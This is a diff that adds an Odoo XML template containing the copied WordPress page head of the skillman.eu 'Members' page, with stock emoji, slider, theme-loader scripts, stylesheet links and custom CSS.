@@ -1,0 +1,565 @@
+<?xml version="1.0" encoding="utf-8"?>
+<odoo>
+    <template id="members" name="skillman_website">
+        <head>
+	<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+		<meta name="theme-color" content="#1ebbf0"/>	<link rel="profile" href="https://gmpg.org/xfn/11" />
+	<title>Members &#8211; skillman.eu</title>
+<meta name='robots' content='max-image-preview:large' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="skillman.eu &amp;raquo; Feed" href="https://skillman.eu/feed/" />
+<link rel="alternate" type="application/rss+xml" title="skillman.eu &amp;raquo; Comments Feed" href="https://skillman.eu/comments/feed/" />
+<script type="text/javascript">
+    <![CDATA[
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/skillman.eu\/wp-includes\/js\/wp-emoji-release.min.js?ver=6e05696a03d84d1af79a77b950059964"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){p.clearRect(0,0,i.width,i.height),p.fillText(e,0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(t,0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s("\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!s("\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!s("\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!s("\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff","\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
+]]>
+</script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css' href='https://skillman.eu/wp-includes/css/dist/block-library/style.min.css?ver=6e05696a03d84d1af79a77b950059964' type='text/css' media='all' />
+<style id='wp-block-library-theme-inline-css' type='text/css'>
+.wp-block-audio figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio figcaption{color:hsla(0,0%,100%,.65)}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed figcaption{color:hsla(0,0%,100%,.65)}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:hsla(0,0%,100%,.65)}.wp-block-image figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-image figcaption{color:hsla(0,0%,100%,.65)}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video{margin:0 0 1em}.wp-block-template-part.has-background{margin-bottom:0;margin-top:0;padding:1.25em 2.375em}
+</style>
+<link rel='stylesheet' id='classic-theme-styles-css' href='https://skillman.eu/wp-includes/css/classic-themes.min.css?ver=6e05696a03d84d1af79a77b950059964' type='text/css' media='all' />
+<style id='global-styles-inline-css' type='text/css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #FFF;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--accent: #1ebbf0;--wp--preset--color--dark-gray: #111;--wp--preset--color--light-gray: #767676;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='the7-font-css' href='https://skillman.eu/wp-content/themes/dt-the7/fonts/icomoon-the7-font/icomoon-the7-font.min.css?ver=11.8.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='the7-awesome-fonts-css' href='https://skillman.eu/wp-content/themes/dt-the7/fonts/FontAwesome/css/all.min.css?ver=11.8.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='the7-awesome-fonts-back-css' href='https://skillman.eu/wp-content/themes/dt-the7/fonts/FontAwesome/back-compat.min.css?ver=11.8.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='the7-Defaults-css' href='https://skillman.eu/wp-content/uploads/smile_fonts/Defaults/Defaults.css?ver=6e05696a03d84d1af79a77b950059964' type='text/css' media='all' />
+<link rel='stylesheet' id='the7-fontello-css' href='https://skillman.eu/wp-content/themes/dt-the7/fonts/fontello/css/fontello.min.css?ver=11.8.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='js_composer_front-css' href='https://skillman.eu/wp-content/plugins/js_composer/assets/css/js_composer.min.css?ver=7.0' type='text/css' media='all' />
+<link rel='stylesheet' id='js_composer_custom_css-css' href='//skillman.eu/wp-content/uploads/js_composer/custom.css?ver=7.0' type='text/css' media='all' />
+<link rel='stylesheet' id='dt-web-fonts-css' href='https://fonts.googleapis.com/css?family=Roboto:400,500,600,700' type='text/css' media='all' />
+<link rel='stylesheet' id='dt-main-css' href='https://skillman.eu/wp-content/themes/dt-the7/css/main.min.css?ver=11.8.0.1' type='text/css' media='all' />
+<style id='dt-main-inline-css' type='text/css'>
+body #load {
+  display: block;
+  height: 100%;
+  overflow: hidden;
+  position: fixed;
+  width: 100%;
+  z-index: 9901;
+  opacity: 1;
+  visibility: visible;
+  transition: all .35s ease-out;
+}
+.load-wrap {
+  width: 100%;
+  height: 100%;
+  background-position: center center;
+  background-repeat: no-repeat;
+  text-align: center;
+  display: -ms-flexbox;
+  display: -ms-flex;
+  display: flex;
+  -ms-align-items: center;
+  -ms-flex-align: center;
+  align-items: center;
+  -ms-flex-flow: column wrap;
+  flex-flow: column wrap;
+  -ms-flex-pack: center;
+  -ms-justify-content: center;
+  justify-content: center;
+}
+.load-wrap > svg {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%,-50%);
+}
+#load {
+  background: var(--the7-elementor-beautiful-loading-bg,#ffffff);
+  --the7-beautiful-spinner-color2: var(--the7-beautiful-spinner-color,rgba(51,51,51,0.3));
+}
+
+</style>
+<link rel='stylesheet' id='the7-custom-scrollbar-css' href='https://skillman.eu/wp-content/themes/dt-the7/lib/custom-scrollbar/custom-scrollbar.min.css?ver=11.8.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='the7-wpbakery-css' href='https://skillman.eu/wp-content/themes/dt-the7/css/wpbakery.min.css?ver=11.8.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='the7-css-vars-css' href='https://skillman.eu/wp-content/uploads/the7-css/css-vars.css?ver=c7286e7940ab' type='text/css' media='all' />
+<link rel='stylesheet' id='dt-custom-css' href='https://skillman.eu/wp-content/uploads/the7-css/custom.css?ver=c7286e7940ab' type='text/css' media='all' />
+<link rel='stylesheet' id='dt-media-css' href='https://skillman.eu/wp-content/uploads/the7-css/media.css?ver=c7286e7940ab' type='text/css' media='all' />
+<link rel='stylesheet' id='the7-mega-menu-css' href='https://skillman.eu/wp-content/uploads/the7-css/mega-menu.css?ver=c7286e7940ab' type='text/css' media='all' />
+<link rel='stylesheet' id='style-css' href='https://skillman.eu/wp-content/themes/dt-the7/style.css?ver=11.8.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='ultimate-vc-addons-style-css' href='https://skillman.eu/wp-content/plugins/Ultimate_VC_Addons/assets/min-css/style.min.css?ver=3.19.15' type='text/css' media='all' />
+<script type='text/javascript' src='https://skillman.eu/wp-includes/js/jquery/jquery.min.js?ver=3.6.4' id='jquery-core-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.0' id='jquery-migrate-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/plugins/revslider/public/assets/js/rbtools.min.js?ver=6.6.15' async="1" id='tp-tools-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/plugins/revslider/public/assets/js/rs6.min.js?ver=6.6.15' async="1" id='revmin-js'></script>
+<script type='text/javascript' id='dt-above-fold-js-extra'>
+/* <![CDATA[ */
+var dtLocal = {"themeUrl":"https:\/\/skillman.eu\/wp-content\/themes\/dt-the7","passText":"To view this protected post, enter the password below:","moreButtonText":{"loading":"Loading...","loadMore":"Load more"},"postID":"44996","ajaxurl":"https:\/\/skillman.eu\/wp-admin\/admin-ajax.php","REST":{"baseUrl":"https:\/\/skillman.eu\/wp-json\/the7\/v1","endpoints":{"sendMail":"\/send-mail"}},"contactMessages":{"required":"One or more fields have an error. Please check and try again.","terms":"Please accept the privacy policy.","fillTheCaptchaError":"Please, fill the captcha."},"captchaSiteKey":"","ajaxNonce":"d9c1aae5b5","pageData":{"type":"page","template":"page","layout":null},"themeSettings":{"smoothScroll":"off","lazyLoading":false,"desktopHeader":{"height":90},"ToggleCaptionEnabled":"disabled","ToggleCaption":"Navigation","floatingHeader":{"showAfter":94,"showMenu":true,"height":60,"logo":{"showLogo":true,"html":"<img class=\" preload-me\" src=\"https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-small.png\" srcset=\"https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-small.png 175w, https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-retina.png 350w\" width=\"175\" height=\"53\"   sizes=\"175px\" alt=\"skillman.eu\" \/>","url":"https:\/\/skillman.eu\/"}},"topLine":{"floatingTopLine":{"logo":{"showLogo":false,"html":""}}},"mobileHeader":{"firstSwitchPoint":990,"secondSwitchPoint":778,"firstSwitchPointHeight":90,"secondSwitchPointHeight":60,"mobileToggleCaptionEnabled":"disabled","mobileToggleCaption":"Menu"},"stickyMobileHeaderFirstSwitch":{"logo":{"html":"<img class=\" preload-me\" src=\"https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-small.png\" srcset=\"https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-small.png 175w, https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-retina.png 350w\" width=\"175\" height=\"53\"   sizes=\"175px\" alt=\"skillman.eu\" \/>"}},"stickyMobileHeaderSecondSwitch":{"logo":{"html":"<img class=\" preload-me\" src=\"https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-small.png\" srcset=\"https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-small.png 175w, https:\/\/skillman.eu\/wp-content\/uploads\/2021\/10\/logoskillman-retina.png 350w\" width=\"175\" height=\"53\"   sizes=\"175px\" alt=\"skillman.eu\" \/>"}},"sidebar":{"switchPoint":990},"boxedWidth":"1340px"},"VCMobileScreenWidth":"768"};
+var dtShare = {"shareButtonText":{"facebook":"Share on Facebook","twitter":"Tweet","pinterest":"Pin it","linkedin":"Share on Linkedin","whatsapp":"Share on Whatsapp"},"overlayOpacity":"85"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/themes/dt-the7/js/above-the-fold.min.js?ver=11.8.0.1' id='dt-above-fold-js'></script>
+<script type='text/javascript' src='https://skillman.eu/wp-content/plugins/Ultimate_VC_Addons/assets/min-js/ultimate-params.min.js?ver=3.19.15' id='ultimate-vc-addons-params-js'></script>
+<script></script><link rel="https://api.w.org/" href="https://skillman.eu/wp-json/" /><link rel="alternate" type="application/json" href="https://skillman.eu/wp-json/wp/v2/pages/44996" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://skillman.eu/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://skillman.eu/wp-includes/wlwmanifest.xml" />
+
+<link rel="canonical" href="https://skillman.eu/members/" />
+<link rel='shortlink' href='https://skillman.eu/?p=44996' />
+<link rel="alternate" type="application/json+oembed" href="https://skillman.eu/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fskillman.eu%2Fmembers%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://skillman.eu/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fskillman.eu%2Fmembers%2F&#038;format=xml" />
+<meta property="og:site_name" content="skillman.eu" />
+<meta property="og:title" content="Members" />
+<meta property="og:url" content="https://skillman.eu/members/" />
+<meta property="og:type" content="article" />
+<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress."/>
+<meta name="generator" content="Powered by Slider Revolution 6.6.15 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
+<script type="text/javascript" id="the7-loader-script">
+document.addEventListener("DOMContentLoaded", function(event) {
+	var load = document.getElementById("load");
+	if(!load.classList.contains('loader-removed')){
+		var removeLoading = setTimeout(function() {
+			load.className += " loader-removed";
+		}, 300);
+	}
+});
+</script>
+		<link rel="icon" href="https://skillman.eu/wp-content/uploads/2020/07/cropped-skillman-logo-solo-sfondato-BN-1-150x150.png" sizes="32x32" />
+<link rel="icon" href="https://skillman.eu/wp-content/uploads/2020/07/cropped-skillman-logo-solo-sfondato-BN-1-200x200.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://skillman.eu/wp-content/uploads/2020/07/cropped-skillman-logo-solo-sfondato-BN-1-200x200.png" />
+<meta name="msapplication-TileImage" content="https://skillman.eu/wp-content/uploads/2020/07/cropped-skillman-logo-solo-sfondato-BN-1.png" />
+<script>
+    <![CDATA[
+    function setREVStartSize(e){
+			//window.requestAnimationFrame(function() {
+				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;
+				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;
+				try {
+					var pw = document.getElementById(e.c).parentNode.offsetWidth,
+						newh;
+					pw = pw===0 || isNaN(pw) || (e.l=="fullwidth" || e.layout=="fullwidth") ? window.RSIW : pw;
+					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
+					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
+					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
+					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
+					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
+					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
+					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);
+					if(e.layout==="fullscreen" || e.l==="fullscreen")
+						newh = Math.max(e.mh,window.RSIH);
+					else{
+						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
+						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];
+						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
+						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
+						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
+
+						var nl = new Array(e.rl.length),
+							ix = 0,
+							sl;
+						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
+						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
+						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
+						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;
+						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
+						sl = nl[0];
+						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}
+						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);
+						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
+					}
+					var el = document.getElementById(e.c);
+					if (el!==null && el) el.style.height = newh+"px";
+					el = document.getElementById(e.c+"_wrapper");
+					if (el!==null && el) {
+						el.style.height = newh+"px";
+						el.style.display = "block";
+					}
+				} catch(e){
+					console.log("Failure at Presize of Slider:" + e)
+				}
+			//});
+		  };
+		  ]]>
+</script>
+		<style type="text/css" id="wp-custom-css">
+			#bottom-bar .wf-container-bottom{
+	border: none !important;
+	padding-bottom: 60px;
+}
+
+.keynotespeakers{ width: 90%;}
+
+
+
+.category-no-author .author-info, .category-no-author .post-meta {
+    display:none !important;
+}
+
+
+
+/* per nascondere i blocchi */
+.HIDDEN{
+	display: none;
+}
+
+
+
+
+/* per nascondere la bottom bar ovunque */
+wf-container-bottom{
+	display: none;
+}
+
+
+
+/*toglie dall'home page il banner SIF*/
+.sifcomingsoon{display:none;}
+
+
+/* footer fix*/
+.wp-image-37969 {height: 75px !important;}
+
+
+
+
+/* TEAM */
+.owl-carousel.owl-loaded {
+
+    width: 90% !important;
+    left: 100px !important;
+}
+
+.dt-owl-item
+{
+}
+
+#withthecontribution{
+height: 100%;}
+
+#withthecontribution .vc_single_image-img {
+/*height: 80px !important;*/
+object-fit: contain;
+height: 90px !important;
+}
+
+#inpartnership1 .vc_single_image-img, #inpartnership2 .vc_single_image-img {
+object-fit: contain;
+height: 90px !important;
+max-height: 100px;
+}
+.eighypercentwide{
+	width:80%;
+}
+
+.incollaborationwith {
+float: right;
+}
+
+.incollaborationwith img{
+		padding-left: 10px !important;
+	  height: 85px !important;
+}
+
+#incollaborationwith{
+	margin: 0 50px;
+}
+
+#lp-confirm.lp-confirm-style4 {}
+
+#primary-menu{}		</style>
